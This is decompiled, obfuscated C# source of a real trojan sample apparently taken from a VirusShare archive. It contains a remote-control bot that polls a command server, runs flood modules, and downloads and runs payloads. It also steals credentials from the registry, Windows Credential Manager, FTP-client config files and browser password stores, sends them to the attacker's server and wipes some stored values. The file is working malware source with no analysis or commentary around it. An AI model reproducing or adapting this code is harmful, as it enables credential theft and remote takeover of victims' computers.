// Decompiled with JetBrains decompiler
// Type: ___codefort.P
// Assembly: audiohd, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B3C2E6D6-337D-408B-994E-703E532E1FED
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.PornoAsset.dkhr-b435741867a0fdbf28756592cb30b1bd1f0b2169008f656b542888b53198a9b8.exe

using Microsoft.Win32;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using System.Xml;

namespace ___codefort
{
  internal sealed class P
  {
    private Thread \u0002 = new Thread(new ThreadStart(V.\u0002));
    public static string \u0003;
    private string \u0005 = string.Empty;
    public static string \u0008 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + I.\u0002(737972588);
    public static string \u0006 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + I.\u0002(737972483);
    private static ___codefort.P.\u0005 bd;

    public void \u0002()
    {
      this.\u0003();
      new Thread(new ThreadStart(this.\u0005)).Start();
    }

    private void \u0003()
    {
      string str1 = I.\u0002(737971456) + \u000F.\u0002.C + I.\u0002(737971485) + \u000F.\u0002.\u0006 + I.\u0002(737971490) + \u000F.\u0002.F + I.\u0002(737971507) + \u000F.\u0002.E;
      while (true)
      {
        try
        {
          string str2 = this.\u0002(\u000F.\u0002.P, str1);
          if (str2.Length > 0)
          {
            if (str2 == \u000F.\u0002.\u0003)
              break;
            Environment.Exit(-1);
          }
        }
        catch
        {
        }
        Thread.Sleep(\u000F.\u0002.\u0005 * 60 * 1000);
      }
    }

    private void \u0005()
    {
      string str1 = I.\u0002(737970880) + \u000F.\u0002.C;
      while (true)
      {
        try
        {
          string str2 = this.\u0002(\u000F.\u0002.P, str1);
          if (str2.Length > 0)
          {
            if (str2 != this.\u0005)
            {
              this.\u0002(str2);
              this.\u0005 = str2;
            }
          }
          else
          {
            try
            {
              \u0002.\u0003();
            }
            catch
            {
            }
            try
            {
              R.\u0003();
            }
            catch
            {
            }
            try
            {
              S.\u0003();
            }
            catch
            {
            }
            try
            {
              \u0003.\u0003();
            }
            catch
            {
            }
            this.\u0005 = string.Empty;
          }
        }
        catch
        {
        }
        Thread.Sleep(\u000F.\u0002.\u0005 * 60 * 1000);
      }
    }

    public static string \u0002(string _param0, string _param1)
    {
      try
      {
        ServicePointManager.Expect100Continue = false;
        HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(_param0);
        httpWebRequest.ContentType = I.\u0002(737970909);
        httpWebRequest.Method = I.\u0002(737970821);
        httpWebRequest.UserAgent = \u000F.\u0002.\u0003;
        byte[] bytes = Encoding.ASCII.GetBytes(_param1);
        httpWebRequest.ContentLength = (long) bytes.Length;
        Stream requestStream = httpWebRequest.GetRequestStream();
        requestStream.Write(bytes, 0, bytes.Length);
        requestStream.Close();
        WebResponse response = httpWebRequest.GetResponse();
        return response == null ? (string) null : new StreamReader(response.GetResponseStream()).ReadToEnd().Trim();
      }
      catch
      {
        Environment.Exit(0);
        return (string) null;
      }
    }

    private string \u0002(string _param1, string _param2)
    {
      ServicePointManager.Expect100Continue = false;
      HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(_param1);
      httpWebRequest.ContentType = I.\u0002(737970909);
      httpWebRequest.Method = I.\u0002(737970821);
      httpWebRequest.UserAgent = \u000F.\u0002.\u0003;
      byte[] bytes = Encoding.ASCII.GetBytes(_param2);
      httpWebRequest.ContentLength = (long) bytes.Length;
      Stream requestStream = httpWebRequest.GetRequestStream();
      requestStream.Write(bytes, 0, bytes.Length);
      requestStream.Close();
      WebResponse response = httpWebRequest.GetResponse();
      return response == null ? string.Empty : new StreamReader(response.GetResponseStream()).ReadToEnd().Trim();
    }

    private void \u0002(string _param1)
    {
      string[] strArray = new string[0];
      try
      {
        strArray = _param1.Split('*');
      }
      catch
      {
      }
      string key;
      if ((key = strArray[0]) == null)
        return;
      if (J.\u0003 == null)
        J.\u0003 = new Dictionary<string, int>(13)
        {
          {
            I.\u0002(737970830),
            0
          },
          {
            I.\u0002(737970847),
            1
          },
          {
            I.\u0002(737970863),
            2
          },
          {
            I.\u0002(737970876),
            3
          },
          {
            I.\u0002(737970764),
            4
          },
          {
            I.\u0002(737970781),
            5
          },
          {
            I.\u0002(737970785),
            6
          },
          {
            I.\u0002(737970804),
            7
          },
          {
            I.\u0002(737970811),
            8
          },
          {
            I.\u0002(737970698),
            9
          },
          {
            I.\u0002(737970714),
            10
          },
          {
            I.\u0002(737970740),
            11
          },
          {
            I.\u0002(737970746),
            12
          }
        };
      int num1;
      // ISSUE: explicit non-virtual call
      if (!__nonvirtual (J.\u0003.TryGetValue(key, out num1)))
        return;
      switch (num1)
      {
        case 0:
          try
          {
            \u0002.\u0005 = Convert.ToString(strArray[1]);
            \u0002.\u0006 = ushort.Parse(strArray[2]);
            \u0002.P = Convert.ToInt32(strArray[3]);
            \u0002.bc = Convert.ToInt32(strArray[4]);
            \u0002.\u0002();
            break;
          }
          catch
          {
            break;
          }
        case 1:
          try
          {
            R.\u0005 = Convert.ToString(strArray[1]);
            R.\u0006 = Convert.ToInt32(strArray[2]);
            R.\u0002();
            break;
          }
          catch
          {
            break;
          }
        case 2:
          try
          {
            S.\u0005 = Convert.ToString(strArray[1]);
            S.\u0006 = ushort.Parse(strArray[2]);
            S.P = Convert.ToInt32(strArray[3]);
            S.O = Convert.ToInt32(strArray[4]);
            S.bd = Convert.ToInt32(strArray[5]);
            S.\u0002();
            break;
          }
          catch
          {
            break;
          }
        case 3:
          try
          {
            \u0003.\u0005 = Convert.ToString(strArray[1]);
            \u0003.bd = ushort.Parse(strArray[2]);
            \u0003.O = Convert.ToInt32(strArray[3]);
            \u0003.\u0008 = Convert.ToInt32(strArray[4]);
            \u0003.bc = Convert.ToInt32(strArray[5]);
            \u0003.\u0002();
            break;
          }
          catch
          {
            break;
          }
        case 4:
          try
          {
            string str = \u000F.\u0003.\u0002(new Random().Next(5, 12)) + I.\u0002(737969707);
            new WebClient().DownloadFile(Convert.ToString(strArray[1]), Environment.GetEnvironmentVariable(I.\u0002(737969894)) + I.\u0002(737969724) + str);
            new Process()
            {
              StartInfo = {
                FileName = (Environment.GetEnvironmentVariable(I.\u0002(737969894)) + I.\u0002(737969724) + str)
              }
            }.Start();
            break;
          }
          catch
          {
            break;
          }
        case 5:
          try
          {
            Process process = new Process()
            {
              StartInfo = new ProcessStartInfo(Convert.ToString(strArray[1]))
            };
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process.Start();
            break;
          }
          catch
          {
            break;
          }
        case 6:
          try
          {
            \u000F.\u0008.\u0002(Convert.ToString(strArray[1]));
            break;
          }
          catch
          {
            break;
          }
        case 7:
          if (!(strArray[1] == Environment.MachineName) && !(strArray[1].ToUpper() == I.\u0002(737971146)))
            break;
          \u000F.\u0008.\u0008();
          break;
        case 8:
          try
          {
            int num2 = (int) MessageBox.Show(strArray[1], strArray[2]);
            break;
          }
          catch
          {
            break;
          }
        case 9:
          try
          {
            ___codefort.P.\u0005();
            break;
          }
          catch
          {
            break;
          }
        case 10:
          try
          {
            ___codefort.P.\u0002();
            break;
          }
          catch
          {
            break;
          }
        case 11:
          try
          {
            ___codefort.P.\u0002(strArray[1], strArray[2]);
            break;
          }
          catch
          {
            break;
          }
        case 12:
          try
          {
            V.\u0002();
            break;
          }
          catch
          {
            break;
          }
      }
    }

    public static void \u0002()
    {
      ___codefort.P.\u0002(\u000F.\u0002.R + I.\u0002(737971639), I.\u0002(737971647) + \u000F.\u0002.F + I.\u0002(737971164) + \u000F.\u0002.E + I.\u0002(737971181) + \u000F.\u0002.r);
      RegistryKey registryKey1 = Registry.LocalMachine.OpenSubKey(I.\u0002(737971079), true);
      if (registryKey1 != null)
      {
        ___codefort.P.\u0002(\u000F.\u0002.R + I.\u0002(737971639), I.\u0002(737971647) + \u000F.\u0002.F + I.\u0002(737971114) + (string) registryKey1.GetValue(I.\u0002(737971028)) + I.\u0002(737971566) + (string) registryKey1.GetValue(I.\u0002(737971041)));
        registryKey1.SetValue(I.\u0002(737971028), (object) string.Empty);
        registryKey1.SetValue(I.\u0002(737971041), (object) string.Empty);
      }
      RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey(I.\u0002(737971071), true);
      if (registryKey2 != null)
      {
        ___codefort.P.\u0002(\u000F.\u0002.R + I.\u0002(737971639), I.\u0002(737971647) + \u000F.\u0002.F + I.\u0002(737970976) + (string) registryKey2.GetValue(I.\u0002(737970393)));
        registryKey2.SetValue(I.\u0002(737970393), (object) string.Empty);
      }
      RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey(I.\u0002(737970412), true);
      if (registryKey3 != null)
      {
        ___codefort.P.\u0002(\u000F.\u0002.R + I.\u0002(737971639), I.\u0002(737971647) + \u000F.\u0002.F + I.\u0002(737970327) + (string) registryKey3.GetValue(I.\u0002(737970393)));
        registryKey3.SetValue(I.\u0002(737970393), (object) string.Empty);
      }
      RegistryKey registryKey4 = Registry.LocalMachine.OpenSubKey(I.\u0002(737970242), true);
      if (registryKey4 != null)
      {
        ___codefort.P.\u0002(\u000F.\u0002.R + I.\u0002(737971639), I.\u0002(737971647) + \u000F.\u0002.F + I.\u0002(737970178) + (string) registryKey4.GetValue(I.\u0002(737971028)) + I.\u0002(737970228) + (string) registryKey4.GetValue(I.\u0002(737971041)));
        registryKey4.SetValue(I.\u0002(737971028), (object) string.Empty);
        registryKey4.SetValue(I.\u0002(737971041), (object) string.Empty);
      }
      RegistryKey registryKey5 = Registry.LocalMachine.OpenSubKey(I.\u0002(737970629), true);
      if (registryKey5 != null)
      {
        ___codefort.P.\u0002(\u000F.\u0002.R + I.\u0002(737971639), I.\u0002(737971647) + \u000F.\u0002.F + I.\u0002(737970563) + (string) registryKey5.GetValue(I.\u0002(737970610)));
        registryKey5.SetValue(I.\u0002(737970610), (object) string.Empty);
      }
      RegistryKey registryKey6 = Registry.LocalMachine.OpenSubKey(I.\u0002(737970503), true);
      if (registryKey6 != null)
      {
        ___codefort.P.\u0002(\u000F.\u0002.R + I.\u0002(737971639), I.\u0002(737971647) + \u000F.\u0002.F + I.\u0002(737970454) + (string) registryKey6.GetValue(I.\u0002(737970610)));
        registryKey6.SetValue(I.\u0002(737970610), (object) string.Empty);
      }
      RegistryKey registryKey7 = Registry.LocalMachine.OpenSubKey(I.\u0002(737973962), true);
      if (registryKey7 != null)
      {
        ___codefort.P.\u0002(\u000F.\u0002.R + I.\u0002(737971639), I.\u0002(737971647) + \u000F.\u0002.F + I.\u0002(737973914) + (string) registryKey7.GetValue(I.\u0002(737970610)));
        registryKey7.SetValue(I.\u0002(737970610), (object) string.Empty);
      }
      RegistryKey registryKey8 = Registry.LocalMachine.OpenSubKey(I.\u0002(737973855), true);
      if (registryKey8 != null)
      {
        ___codefort.P.\u0002(\u000F.\u0002.R + I.\u0002(737971639), I.\u0002(737971647) + \u000F.\u0002.F + I.\u0002(737973815) + (string) registryKey8.GetValue(I.\u0002(737970610)));
        registryKey8.SetValue(I.\u0002(737970610), (object) string.Empty);
      }
      RegistryKey registryKey9 = Registry.LocalMachine.OpenSubKey(I.\u0002(737974256), true);
      if (registryKey9 != null)
      {
        ___codefort.P.\u0002(\u000F.\u0002.R + I.\u0002(737971639), I.\u0002(737971647) + \u000F.\u0002.F + I.\u0002(737974085) + (string) registryKey9.GetValue(I.\u0002(737970610)));
        registryKey9.SetValue(I.\u0002(737970610), (object) string.Empty);
      }
      RegistryKey registryKey10 = Registry.LocalMachine.OpenSubKey(I.\u0002(737974131), true);
      if (registryKey10 != null)
      {
        ___codefort.P.\u0002(\u000F.\u0002.R + I.\u0002(737971639), I.\u0002(737971647) + \u000F.\u0002.F + I.\u0002(737973441) + (string) registryKey10.GetValue(I.\u0002(737970610)));
        registryKey10.SetValue(I.\u0002(737970610), (object) string.Empty);
      }
      RegistryKey registryKey11 = Registry.LocalMachine.OpenSubKey(I.\u0002(737973496), true);
      if (registryKey11 != null)
      {
        ___codefort.P.\u0002(\u000F.\u0002.R + I.\u0002(737971639), I.\u0002(737971647) + \u000F.\u0002.F + I.\u0002(737973331) + (string) registryKey11.GetValue(I.\u0002(737970610)));
        registryKey11.SetValue(I.\u0002(737970610), (object) string.Empty);
      }
      RegistryKey registryKey12 = Registry.LocalMachine.OpenSubKey(I.\u0002(737973279), true);
      if (registryKey12 != null)
      {
        ___codefort.P.\u0002(\u000F.\u0002.R + I.\u0002(737971639), I.\u0002(737971647) + \u000F.\u0002.F + I.\u0002(737973751) + (string) registryKey12.GetValue(I.\u0002(737970610)));
        registryKey12.SetValue(I.\u0002(737970610), (object) string.Empty);
      }
      RegistryKey registryKey13 = Registry.LocalMachine.OpenSubKey(I.\u0002(737973680), true);
      if (registryKey13 != null)
      {
        ___codefort.P.\u0002(\u000F.\u0002.R + I.\u0002(737971639), I.\u0002(737971647) + \u000F.\u0002.F + I.\u0002(737973512) + (string) registryKey13.GetValue(I.\u0002(737970610)));
        registryKey13.SetValue(I.\u0002(737970610), (object) string.Empty);
      }
      RegistryKey registryKey14 = Registry.LocalMachine.OpenSubKey(I.\u0002(737972949), true);
      if (registryKey14 != null)
      {
        ___codefort.P.\u0002(\u000F.\u0002.R + I.\u0002(737971639), I.\u0002(737971647) + \u000F.\u0002.F + I.\u0002(737972898) + (string) registryKey14.GetValue(I.\u0002(737970610)));
        registryKey14.SetValue(I.\u0002(737970610), (object) string.Empty);
      }
      RegistryKey registryKey15 = Registry.LocalMachine.OpenSubKey(I.\u0002(737972844), true);
      if (registryKey15 == null)
        return;
      ___codefort.P.\u0002(\u000F.\u0002.R + I.\u0002(737971639), I.\u0002(737971647) + \u000F.\u0002.F + I.\u0002(737972757) + (string) registryKey15.GetValue(I.\u0002(737972798)));
      registryKey15.SetValue(I.\u0002(737970610), (object) string.Empty);
    }

    public static string \u0002(string _param0)
    {
      try
      {
        if (_param0 == null)
          _param0 = I.\u0002(737973196);
        byte[] numArray = new byte[_param0.Length];
        return Convert.ToBase64String(Encoding.UTF8.GetBytes(_param0));
      }
      catch
      {
        return I.\u0002(737973196);
      }
    }

    public static string \u0003(string _param0)
    {
      try
      {
        Decoder decoder = new UTF8Encoding().GetDecoder();
        byte[] bytes = Convert.FromBase64String(_param0);
        char[] chars = new char[decoder.GetCharCount(bytes, 0, bytes.Length)];
        decoder.GetChars(bytes, 0, bytes.Length, chars, 0);
        return new string(chars);
      }
      catch
      {
        return I.\u0002(737973203);
      }
    }

    [DllImport("user32.dll", EntryPoint = "ShowWindow")]
    private static extern int \u0002(int _param0, int _param1);

    private static void \u0002(string _param0, string _param1)
    {
      if (!___codefort.P.\u0002())
        return;
      ___codefort.P.\u0003(_param0, ___codefort.P.\u0006 + _param1 + I.\u0002(737973231));
      ___codefort.P.\u0003();
    }

    private static bool \u0002() => System.IO.File.Exists(___codefort.P.\u0008);

    private static void \u0003(string _param0, string _param1)
    {
      try
      {
        new WebClient().DownloadFile(_param0, _param1);
        Process.Start(new ProcessStartInfo()
        {
          FileName = ___codefort.P.\u0008,
          Arguments = I.\u0002(737973244) + ___codefort.P.\u0006 + I.\u0002(737969405) + _param1
        });
        Thread.Sleep(1000);
      }
      catch
      {
      }
    }

    private static void \u0003()
    {
      foreach (Process process in Process.GetProcesses())
      {
        if (process.ProcessName.Contains(I.\u0002(737973134)))
        {
          try
          {
            ___codefort.P.\u0002(process.MainWindowHandle.ToInt32(), 0);
          }
          catch
          {
          }
        }
      }
    }

    private static void \u0005()
    {
      ___codefort.P.bc();
      ___codefort.P.bd();
      ___codefort.P.P();
      ___codefort.P.\u0006();
      if (!Directory.Exists(Environment.GetEnvironmentVariable(I.\u0002(737973151)) + I.\u0002(737973160)))
        return;
      ___codefort.P.\u0003 = Environment.GetEnvironmentVariable(I.\u0002(737973151)) + I.\u0002(737973160);
      ___codefort.P.\u0003.\u0002(\u000F.\u0002.O);
    }

    public static void \u0008()
    {
      string str1 = (string) Registry.GetValue(I.\u0002(737973056), string.Empty, (object) null);
      string str2 = ___codefort.P.\u0005((string) Registry.GetValue(I.\u0002(737973104), string.Empty, (object) null));
      ___codefort.P.\u0002(\u000F.\u0002.O + I.\u0002(737971639), I.\u0002(737971647) + \u000F.\u0002.F + I.\u0002(737973024) + str1 + I.\u0002(737971566) + str2);
    }

    public static void \u0006()
    {
      try
      {
        XmlDocument xmlDocument = new XmlDocument();
        xmlDocument.Load(Environment.GetEnvironmentVariable(I.\u0002(737971297)) + I.\u0002(737973051));
        foreach (XmlNode selectNode in xmlDocument.SelectNodes(I.\u0002(737972452)))
        {
          try
          {
            string innerText1 = selectNode.ChildNodes.Item(0).InnerText;
            string innerText2 = selectNode.ChildNodes.Item(4).InnerText;
            string innerText3 = selectNode.ChildNodes.Item(5).InnerText;
            ___codefort.P.\u0002(\u000F.\u0002.O + I.\u0002(737971639), I.\u0002(737971647) + \u000F.\u0002.F + I.\u0002(737972365) + innerText2 + I.\u0002(737971566) + innerText3 + I.\u0002(737971580) + innerText1);
          }
          catch
          {
          }
        }
      }
      catch
      {
      }
    }

    public static string \u0005(string _param0)
    {
      string empty = string.Empty;
      for (int startIndex = 0; startIndex < _param0.Length; startIndex += 2)
      {
        char int32 = (char) Convert.ToInt32(_param0.Substring(startIndex, 2), 16);
        empty += int32.ToString();
      }
      return empty;
    }

    public static void bd()
    {
      string path = Environment.GetEnvironmentVariable(I.\u0002(737971297)) + I.\u0002(737972387);
      if (!System.IO.File.Exists(path))
        return;
      string str1 = System.IO.File.ReadAllText(path).Replace(I.\u0002(737972295), string.Empty);
      char[] chArray = new char[1]{ '\n' };
      foreach (string str2 in str1.Split(chArray))
      {
        if (str2.Contains(I.\u0002(737972302)))
          str2.Replace(I.\u0002(737972302), string.Empty).Replace(I.\u0002(737972317), string.Empty);
        if (str2.Contains(I.\u0002(737972323)))
          str2.Replace(I.\u0002(737972323), string.Empty).Replace(I.\u0002(737972338), string.Empty);
      }
    }

    [DllImport("advapi32.dll", EntryPoint = "CredEnumerateW", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern bool \u0002(
      string _param0,
      uint _param1,
      out uint _param2,
      out IntPtr _param3);

    [DllImport("crypt32", EntryPoint = "CryptUnprotectData", CharSet = CharSet.Auto, SetLastError = true)]
    internal static extern bool \u0002(
      ref ___codefort.P.\u0008 _param0,
      int _param1,
      int _param2,
      int _param3,
      int _param4,
      int _param5,
      out ___codefort.P.\u0008 _param6);

    public static void bc()
    {
      try
      {
        IntPtr zero = IntPtr.Zero;
        uint length;
        if (!___codefort.P.\u0002(I.\u0002(737972236), 0U, out length, out zero))
          return;
        IntPtr[] numArray = new IntPtr[(IntPtr) length];
        IntPtr num = zero;
        for (int index = 0; (long) index <= (long) (length - 1U); ++index)
        {
          ___codefort.P.\u0008 obj1 = new ___codefort.P.\u0008();
          ___codefort.P.\u0008 obj2 = new ___codefort.P.\u0008();
          IntPtr ptr = (IntPtr) (num.ToInt32() + IntPtr.Size * index);
          numArray[index] = Marshal.ReadIntPtr(ptr);
          ___codefort.P.bd = (___codefort.P.\u0005) Marshal.PtrToStructure(numArray[index], ___codefort.P.bd.GetType());
          obj1.\u0003 = ___codefort.P.bd.bc;
          obj1.\u0002 = ___codefort.P.bd.bd;
          ___codefort.P.\u0002(ref obj1, 0, 0, 0, 0, 1, out obj2);
          obj2.\u0003 = obj1.\u0003;
          ___codefort.P.\u0002(\u000F.\u0002.O + I.\u0002(737971639), I.\u0002(737971647) + \u000F.\u0002.F + I.\u0002(737972263) + ___codefort.P.bd.T + I.\u0002(737971566) + Marshal.PtrToStringBSTR(new IntPtr(obj2.\u0003)) + I.\u0002(737972680));
        }
      }
      catch
      {
      }
    }

    public static void P()
    {
      string path = Environment.GetEnvironmentVariable(I.\u0002(737972696)) + I.\u0002(737972726);
      if (!System.IO.File.Exists(path))
        return;
      string str1 = System.IO.File.ReadAllText(path);
      string str2 = string.Empty;
      string str3 = string.Empty;
      string str4 = str1;
      char[] chArray = new char[1]{ '\n' };
      foreach (string str5 in str4.Split(chArray))
      {
        if (str5.Contains(I.\u0002(737972626)))
          str2 = str5.Replace(I.\u0002(737972626), string.Empty).Replace(I.\u0002(737972642), string.Empty);
        if (str5.Contains(I.\u0002(737972650)))
          str3 = str5.Replace(I.\u0002(737972650), string.Empty).Replace(I.\u0002(737972642), string.Empty);
      }
      string empty1 = string.Empty;
      for (int startIndex = 0; startIndex < str3.Length; startIndex += 2)
        empty1 += ((char) long.Parse(str3.Substring(startIndex, 2), NumberStyles.HexNumber)).ToString();
      long startIndex1 = 0;
      string empty2 = string.Empty;
      for (int startIndex2 = 0; startIndex2 < empty1.Length; ++startIndex2)
      {
        empty2 += (string) (object) (char) ((uint) empty1.Substring(startIndex2, 1)[0] ^ (uint) I.\u0002(737972666).Substring((int) startIndex1, 1)[0]);
        if (startIndex1 == 7L)
          startIndex1 = -1L;
        ++startIndex1;
      }
      if (str2 == null)
        return;
      ___codefort.P.\u0002(\u000F.\u0002.O + I.\u0002(737971639), I.\u0002(737971647) + \u000F.\u0002.F + I.\u0002(737972555) + str2 + I.\u0002(737971566) + empty2 + I.\u0002(737972680));
    }

    public sealed class \u0002
    {
      private IntPtr \u0002;

      public \u0002() => this.\u0002 = IntPtr.Zero;

      public \u0002(string _param1) => this.\u0002(_param1);

      [DllImport("kernel32", EntryPoint = "HeapAlloc")]
      private static extern IntPtr \u0002(IntPtr _param0, uint _param1, uint _param2);

      [DllImport("kernel32", EntryPoint = "GetProcessHeap")]
      private static extern IntPtr \u0002();

      [DllImport("kernel32", EntryPoint = "lstrlen")]
      private static extern int \u0002(IntPtr _param0);

      [DllImport("sqlite3", EntryPoint = "sqlite3_open")]
      private static extern int \u0002(IntPtr _param0, out IntPtr _param1);

      [DllImport("sqlite3", EntryPoint = "sqlite3_close")]
      private static extern int \u0003(IntPtr _param0);

      [DllImport("sqlite3", EntryPoint = "sqlite3_exec")]
      private static extern int \u0002(
        IntPtr _param0,
        IntPtr _param1,
        IntPtr _param2,
        IntPtr _param3,
        out IntPtr _param4);

      [DllImport("sqlite3", EntryPoint = "sqlite3_errmsg")]
      private static extern IntPtr \u0002(IntPtr _param0);

      [DllImport("sqlite3", EntryPoint = "sqlite3_prepare_v2")]
      private static extern int \u0002(
        IntPtr _param0,
        IntPtr _param1,
        int _param2,
        out IntPtr _param3,
        out IntPtr _param4);

      [DllImport("sqlite3", EntryPoint = "sqlite3_step")]
      private static extern int \u0005(IntPtr _param0);

      [DllImport("sqlite3", EntryPoint = "sqlite3_column_count")]
      private static extern int \u0008(IntPtr _param0);

      [DllImport("sqlite3", EntryPoint = "sqlite3_column_name")]
      private static extern IntPtr \u0002(IntPtr _param0, int _param1);

      [DllImport("sqlite3", EntryPoint = "sqlite3_column_type")]
      private static extern int \u0002(IntPtr _param0, int _param1);

      [DllImport("sqlite3", EntryPoint = "sqlite3_column_int")]
      private static extern int \u0003(IntPtr _param0, int _param1);

      [DllImport("sqlite3", EntryPoint = "sqlite3_column_double")]
      private static extern double \u0002(IntPtr _param0, int _param1);

      [DllImport("sqlite3", EntryPoint = "sqlite3_column_text")]
      private static extern IntPtr \u0003(IntPtr _param0, int _param1);

      [DllImport("sqlite3", EntryPoint = "sqlite3_column_blob")]
      private static extern IntPtr \u0005(IntPtr _param0, int _param1);

      [DllImport("sqlite3", EntryPoint = "sqlite3_column_table_name")]
      private static extern IntPtr \u0008(IntPtr _param0, int _param1);

      [DllImport("sqlite3", EntryPoint = "sqlite3_finalize")]
      private static extern int \u0006(IntPtr _param0);

      public void \u0002(string _param1)
      {
        if (___codefort.P.\u0002.\u0002(this.\u0002(_param1), out this.\u0002) != 0)
        {
          this.\u0002 = IntPtr.Zero;
          throw new Exception(I.\u0002(737971946) + _param1 + I.\u0002(737971863));
        }
      }

      public void \u0002()
      {
        if (!(this.\u0002 != IntPtr.Zero))
          return;
        ___codefort.P.\u0002.\u0003(this.\u0002);
      }

      public ArrayList \u0002()
      {
        DataTable dataTable = this.\u0002(I.\u0002(737971871));
        ArrayList arrayList = new ArrayList();
        foreach (DataRow row in (InternalDataCollectionBase) dataTable.Rows)
          arrayList.Add((object) row.ItemArray[0].ToString());
        return arrayList;
      }

      public void \u0003(string _param1)
      {
        IntPtr num;
        ___codefort.P.\u0002.\u0002(this.\u0002, this.\u0002(_param1), IntPtr.Zero, IntPtr.Zero, out num);
        if (num != IntPtr.Zero)
          throw new Exception(I.\u0002(737972183) + _param1 + I.\u0002(737972223) + this.\u0002(___codefort.P.\u0002.\u0002(num)));
      }

      public DataTable \u0002(string _param1)
      {
        IntPtr num1;
        ___codefort.P.\u0002.\u0002(this.\u0002, this.\u0002(_param1), this.\u0002(this.\u0002(_param1)), out num1, out IntPtr _);
        DataTable dataTable = new DataTable();
        int num2 = this.\u0002(num1, ref dataTable);
        while (num2 == 100)
          num2 = this.\u0003(num1, ref dataTable);
        ___codefort.P.\u0002.\u0006(num1);
        return dataTable;
      }

      private int \u0002(IntPtr _param1, ref DataTable _param2)
      {
        _param2 = new DataTable(I.\u0002(737972097));
        if (___codefort.P.\u0002.\u0005(_param1) == 100)
        {
          int length = ___codefort.P.\u0002.\u0008(_param1);
          string empty = string.Empty;
          object[] objArray = new object[length];
          for (int index = 0; index < length; ++index)
          {
            string columnName = this.\u0002(___codefort.P.\u0002.\u0002(_param1, index));
            switch (___codefort.P.\u0002.\u0002(_param1, index))
            {
              case 1:
                _param2.Columns.Add(columnName, System.Type.GetType(I.\u0002(737972115)));
                objArray[index] = (object) ___codefort.P.\u0002.\u0003(_param1, index);
                break;
              case 2:
                _param2.Columns.Add(columnName, System.Type.GetType(I.\u0002(737972140)));
                objArray[index] = (object) ___codefort.P.\u0002.\u0002(_param1, index);
                break;
              case 3:
                _param2.Columns.Add(columnName, System.Type.GetType(I.\u0002(737972152)));
                objArray[index] = (object) this.\u0002(___codefort.P.\u0002.\u0003(_param1, index));
                break;
              case 4:
                _param2.Columns.Add(columnName, System.Type.GetType(I.\u0002(737972152)));
                objArray[index] = (object) this.\u0002(___codefort.P.\u0002.\u0005(_param1, index));
                break;
              default:
                _param2.Columns.Add(columnName, System.Type.GetType(I.\u0002(737972152)));
                objArray[index] = (object) string.Empty;
                break;
            }
          }
          _param2.Rows.Add(objArray);
        }
        return ___codefort.P.\u0002.\u0005(_param1);
      }

      private int \u0003(IntPtr _param1, ref DataTable _param2)
      {
        int length = ___codefort.P.\u0002.\u0008(_param1);
        object[] objArray = new object[length];
        for (int index = 0; index < length; ++index)
        {
          switch (___codefort.P.\u0002.\u0002(_param1, index))
          {
            case 1:
              objArray[index] = (object) ___codefort.P.\u0002.\u0003(_param1, index);
              break;
            case 2:
              objArray[index] = (object) ___codefort.P.\u0002.\u0002(_param1, index);
              break;
            case 3:
              objArray[index] = (object) this.\u0002(___codefort.P.\u0002.\u0003(_param1, index));
              break;
            case 4:
              objArray[index] = (object) this.\u0002(___codefort.P.\u0002.\u0005(_param1, index));
              break;
            default:
              objArray[index] = (object) string.Empty;
              break;
          }
        }
        _param2.Rows.Add(objArray);
        return ___codefort.P.\u0002.\u0005(_param1);
      }

      private IntPtr \u0002(string _param1)
      {
        if (_param1 == null)
          return IntPtr.Zero;
        byte[] bytes = Encoding.UTF8.GetBytes(_param1);
        int num1 = bytes.Length + 1;
        IntPtr num2 = ___codefort.P.\u0002.\u0002(___codefort.P.\u0002.\u0002(), 0U, (uint) num1);
        Marshal.Copy(bytes, 0, num2, bytes.Length);
        Marshal.WriteByte(num2, bytes.Length, (byte) 0);
        return num2;
      }

      private string \u0002(IntPtr _param1)
      {
        if (_param1 == IntPtr.Zero)
          return (string) null;
        Encoding utF8 = Encoding.UTF8;
        int length = this.\u0002(_param1);
        byte[] numArray = new byte[length];
        Marshal.Copy(_param1, numArray, 0, length);
        return utF8.GetString(numArray, 0, length);
      }

      private int \u0002(IntPtr _param1) => _param1 == IntPtr.Zero ? 0 : ___codefort.P.\u0002.\u0002(_param1);

      public enum \u0002
      {
      }
    }

    private static class \u0003
    {
      private static IntPtr \u0002;
      public static string \u0003;
      public static string \u0005;
      public static string \u0008;
      public static string \u0006;

      [DllImport("kernel32.dll", EntryPoint = "LoadLibrary")]
      private static extern IntPtr \u0002(string _param0);

      [DllImport("kernel32", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern IntPtr \u0002(IntPtr _param0, string _param1);

      public static long \u0002(string _param0)
      {
        ___codefort.P.\u0003.\u0002(___codefort.P.\u0003 + I.\u0002(737972052));
        ___codefort.P.\u0003.\u0002(___codefort.P.\u0003 + I.\u0002(737972065));
        ___codefort.P.\u0003.\u0002(___codefort.P.\u0003 + I.\u0002(737972081));
        ___codefort.P.\u0003.\u0002(___codefort.P.\u0003 + I.\u0002(737971974));
        ___codefort.P.\u0003.\u0002(___codefort.P.\u0003 + I.\u0002(737971990));
        ___codefort.P.\u0003.\u0002(___codefort.P.\u0003 + I.\u0002(737972000));
        ___codefort.P.\u0003.\u0002(___codefort.P.\u0003 + I.\u0002(737972018));
        ___codefort.P.\u0003.\u0002(___codefort.P.\u0003 + I.\u0002(737971407));
        ___codefort.P.\u0003.\u0002 = ___codefort.P.\u0003.\u0002(___codefort.P.\u0003 + I.\u0002(737971416));
        return ((___codefort.P.\u0003.\u0003) Marshal.GetDelegateForFunctionPointer(___codefort.P.\u0003.\u0002(___codefort.P.\u0003.\u0002, I.\u0002(737971433)), typeof (___codefort.P.\u0003.\u0003)))(_param0);
      }

